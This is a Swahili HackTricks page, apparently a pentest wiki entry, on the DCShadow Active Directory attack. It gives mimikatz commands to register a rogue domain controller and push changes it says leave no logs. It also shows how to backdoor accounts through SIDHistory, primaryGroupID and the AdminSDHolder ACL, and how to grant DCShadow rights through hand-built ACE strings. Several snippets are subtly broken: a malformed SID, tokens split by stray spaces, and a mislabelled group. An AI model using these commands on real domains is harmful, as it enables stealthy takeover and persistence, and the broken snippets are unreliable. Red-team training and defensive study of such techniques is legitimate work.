<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


# DCShadow

Inasajili **Domain Controller mpya** katika AD na inaitumia ku **sukuma sifa** (SIDHistory, SPNs...) kwenye vitu vilivyotajwa **bila** kuacha **kumbukumbu** yoyote kuhusu **mabadiliko**. Unahitaji uwe na mamlaka ya DA na uwe ndani ya **kikoa cha msingi**.\
Tafadhali kumbuka kuwa ikiwa utatumia data mbaya, kumbukumbu mbaya sana zitaonekana.

Kufanya shambulio hilo, unahitaji mifano 2 ya mimikatz. Moja wao itaanza seva za RPC na mamlaka ya SYSTEM (unapaswa kuonyesha hapa mabadiliko unayotaka kufanya), na mfano mwingine utatumika kusukuma thamani:

{% code title="mimikatz1 (seva za RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Inahitaji DA au sawa" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Tambua kwamba **`elevate::token`** haitafanya kazi katika kikao cha `mimikatz1` kwani inaongeza mamlaka ya mchakato, lakini tunahitaji kuongeza **mamlaka ya mchakato**.\
Unaweza pia kuchagua na "LDAP" kitu: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa mtumiaji na ruhusa ndogo hii:

* Katika **kitu cha kikoa**:
* _DS-Install-Replica_ (Ongeza/Ondoa Nakala katika Kikoa)
* _DS-Replication-Manage-Topology_ (Simamia Topolojia ya Uzalishaji)
* _DS-Replication-Synchronize_ (Uzalishaji wa Uzalishaji)
* Kitu cha **eneo** (na watoto wake) katika **chombo cha Configuration**:
* _CreateChild na DeleteChild_
* Kitu cha **kompyuta ambayo imeandikishwa kama DC**:
* _WriteProperty_ (Sio Andika)
* Kitu cha **lengo**:
* _WriteProperty_ (Sio Andika)

Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kutoa ruhusa hizi kwa mtumiaji asiye na mamlaka (tambua kwamba hii itaacha baadhi ya magogo). Hii ni kizuizi zaidi kuliko kuwa na mamlaka ya DA.\
Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kuwa jina la mtumiaji _**student1**_ wakati anapoingia katika kifaa cha _**mcorp-student1**_ ana ruhusa za DCShadow juu ya kitu cha _**root1user**_.

## Kutumia DCShadow kuunda milango ya nyuma

{% code title="Weka Wasimamizi wa Kampuni katika SIDHistory kwa mtumiaji" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Badilisha PrimaryGroupID (weka mtumiaji kama mwanachama wa Waendeshaji wa Kikoa)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Badilisha ntSecurityDescriptor ya AdminSDHolder (toa Udhibiti Kamili kwa mtumiaji)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Toa ruhusu za DCShadow kwa kutumia DCShadow (hakuna kumbukumbu zilizobadilishwa za ruhusu)

Tunahitaji kuongeza ACE zifuatazo na SID ya mtumiaji mwishoni:

* Kwenye kipengele cha kikoa:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Kwenye kipengele cha kompyuta ya mshambuliaji: `(A;;WP;;;UserSID)`
* Kwenye kipengele cha mtumiaji wa lengo: `(A;;WP;;;UserSID)`
* Kwenye kipengele cha Maeneo katika chombo cha Configuration: `(A;CI;CCDC;;;UserSID)`

Ili kupata ACE ya sasa ya kipengele: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Tambua kuwa katika kesi hii unahitaji kufanya **mabadiliko mengi,** sio moja tu. Kwa hivyo, katika kikao cha **mimikatz1** (seva ya RPC) tumia parameter **`/stack` na kila mabadiliko** unayotaka kufanya. Kwa njia hii, utahitaji tu **`/push`** mara moja ili kutekeleza mabadiliko yote yaliyokwama kwenye seva ya udanganyifu.



[**Maelezo zaidi kuhusu DCShadow katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
